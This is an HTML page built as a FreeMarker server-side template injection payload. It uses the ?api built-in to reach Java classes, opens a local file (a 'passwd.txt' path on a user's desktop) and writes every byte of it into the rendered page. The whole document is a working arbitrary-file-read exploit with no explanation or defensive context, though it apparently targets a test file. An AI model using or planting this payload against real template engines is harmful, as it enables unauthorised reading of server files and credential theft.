<!DOCTYPE html>
<html>
<body>
    <h1>Welcome ${msg}

    <#assign uri=object?api.class.getResource("/").toURI()>
    <#assign input=uri?api.create("C:/Users/luke10481/Desktop/passwd.txt").toURL().openConnection()>
    <#assign is=input?api.getInputStream()>
    FILE:[<#list 0..999999999 as _>
        <#assign byte=is.read()>
        <#if byte == -1>
            <#break>
        </#if>
    ${byte}, </#list>]

    </h1>
</body>
</html>